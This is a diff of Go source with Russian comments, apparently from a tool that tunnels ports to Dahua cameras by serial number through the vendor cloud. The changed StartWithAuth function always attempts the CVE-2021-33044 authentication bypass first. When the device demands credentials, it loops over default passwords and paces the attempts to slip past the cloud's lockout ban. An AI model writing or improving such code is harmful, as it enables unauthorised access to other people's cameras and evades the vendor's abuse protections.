@@ -198,16 +198,12 @@ func (f *Forwarder) Stop() {
 	f.t.Terminate()
 }
 
-// StartWithAuth — поднимает форвардер.
-// Если user и pass заданы:
-// СРАЗУ стартует через Type-1 (dtype: 1), БЕЗ отправки пустого Type 0,
-// чтобы не триггерить теневой 5-10 секундный бан облака Dahua на прошивках 2024+.
-//
-// Если user и pass пусты:
-// Сначала пробует Type 0 (CVE-2021-33044).
-// Если устройство вернуло 403 (ErrAuthRequired), значит это прошивка 2024+
-// (или пропатченная). В этом случае выжидается спад бана (LockoutCooldown)
-// и проверяются дефолтные пароли (DefaultPasswords) с паузой LockoutCooldown.
+// StartWithAuth — поднимает форвардер:
+// 1) Сначала ВСЕГДА пробует Type 0 (CVE-2021-33044 байпас).
+// 2) Если вернулась ошибка авторизации (401/403/ErrAuthRequired) или Type 0
+//    не прошёл, а креды заданы — пробует Type-1 (p2p-channel V2) с логином/паролем.
+// 3) Если креды не заданы, но устройство требует авторизацию — перебирает
+//    дефолтные пароли (девайсы 2024+).
 func StartWithAuth(serial, user, pass string, specs []PortSpec) (*Forwarder, error) {
 	targetSerial := serial
 	fallbackProfile := "dmss"
@@ -215,35 +211,23 @@ func StartWithAuth(serial, user, pass string, specs []PortSpec) (*Forwarder, err
 		fallbackProfile = "smartpss"
 	}
 
-	if user != "" && pass != "" {
-		// Известные креды: бьём сразу Type-1 без предварительного Type 0
-		f, err := Start(targetSerial, specs, 1, user, pass)
-		if err == nil {
-			return f, nil
-		}
-		// Если 404 и профиль не зашит явно — пробуем альтернативное облако
-		if errors.Is(err, ErrDeviceNotFound) && !strings.Contains(serial, ",profile=") {
-			altSerial := serial + ",profile=" + fallbackProfile
-			fAlt, errAlt := Start(altSerial, specs, 1, user, pass)
-			if errAlt == nil {
-				return fAlt, nil
-			}
-		}
-		return nil, err
-	}
-
-	// Креды не заданы: пробуем Type 0 (CVE-2021-33044)
+	// 1) Сначала ВСЕГДА пробуем Type 0 (CVE-2021-33044)
 	f, err0 := Start(targetSerial, specs, 0, "", "")
 	if err0 == nil {
+		f.User = user
+		f.Pass = pass
+		f.Dtype = 0
 		return f, nil
 	}
 
-	// Если 404 на дефолтном облаке и профиль не указан явно:
-	// пробуем альтернативный профиль (например, девайс 2024+ сидит на dmss, а дефолт smartpss)
+	// Если 404 на дефолтном облаке и профиль не указан явно — пробуем альтернативное облако по Type 0
 	if errors.Is(err0, ErrDeviceNotFound) && !strings.Contains(serial, ",profile=") {
 		altSerial := serial + ",profile=" + fallbackProfile
 		fAlt, errAlt := Start(altSerial, specs, 0, "", "")
 		if errAlt == nil {
+			fAlt.User = user
+			fAlt.Pass = pass
+			fAlt.Dtype = 0
 			return fAlt, nil
 		}
 		if isAuthError(errAlt) {
@@ -252,32 +236,56 @@ func StartWithAuth(serial, user, pass string, specs []PortSpec) (*Forwarder, err
 		}
 	}
 
-	// Устройство требует авторизацию (403): проверяем пароли (девайсы 2024+)
-	login, passwords := getDefaultCreds()
-	if isAuthError(err0) && len(passwords) > 0 {
-		// Type 0 вызвал 403, значит облако заблокировало попытки к серийнику на 5-10с.
-		// Ждём спада теневого бана перед первой попыткой с паролем.
-		time.Sleep(LockoutCooldown)
-
-		for i, p := range passwords {
-			if i > 0 {
-				time.Sleep(LockoutCooldown)
-			}
-			u := login
-			pw := p
-			if idx := strings.Index(p, ":"); idx >= 0 {
-				u = p[:idx]
-				pw = p[idx+1:]
-			}
-			f1, err1 := Start(targetSerial, specs, 1, u, pw)
+	// 2) Если устройство вернуло 401/403/auth error ИЛИ есть явные креды:
+	if isAuthError(err0) || (user != "" && pass != "") {
+		// Если заданы явные креды — бьём Type-1 ими
+		if user != "" && pass != "" {
+			f1, err1 := Start(targetSerial, specs, 1, user, pass)
 			if err1 == nil {
-				f1.User = u
-				f1.Pass = pw
+				f1.User = user
+				f1.Pass = pass
 				f1.Dtype = 1
 				return f1, nil
 			}
-			if errors.Is(err1, ErrDeviceNotFound) {
-				return nil, err1
+			// Если 404 и профиль не зашит явно — пробуем альтернативное облако
+			if errors.Is(err1, ErrDeviceNotFound) && !strings.Contains(serial, ",profile=") {
+				altSerial := serial + ",profile=" + fallbackProfile
+				fAlt, errAlt := Start(altSerial, specs, 1, user, pass)
+				if errAlt == nil {
+					fAlt.User = user
+					fAlt.Pass = pass
+					fAlt.Dtype = 1
+					return fAlt, nil
+				}
+			}
+			return nil, err1
+		}
+
+		// Креды не заданы: проверяем дефолтные пароли (девайсы 2024+)
+		login, passwords := getDefaultCreds()
+		if len(passwords) > 0 {
+			time.Sleep(LockoutCooldown)
+
+			for i, p := range passwords {
+				if i > 0 {
+					time.Sleep(LockoutCooldown)
+				}
+				u := login
+				pw := p
+				if idx := strings.Index(p, ":"); idx >= 0 {
+					u = p[:idx]
+					pw = p[idx+1:]
+				}
+				f1, err1 := Start(targetSerial, specs, 1, u, pw)
+				if err1 == nil {
+					f1.User = u
+					f1.Pass = pw
+					f1.Dtype = 1
+					return f1, nil
+				}
+				if errors.Is(err1, ErrDeviceNotFound) {
+					return nil, err1
+				}
 			}
 		}
 	}
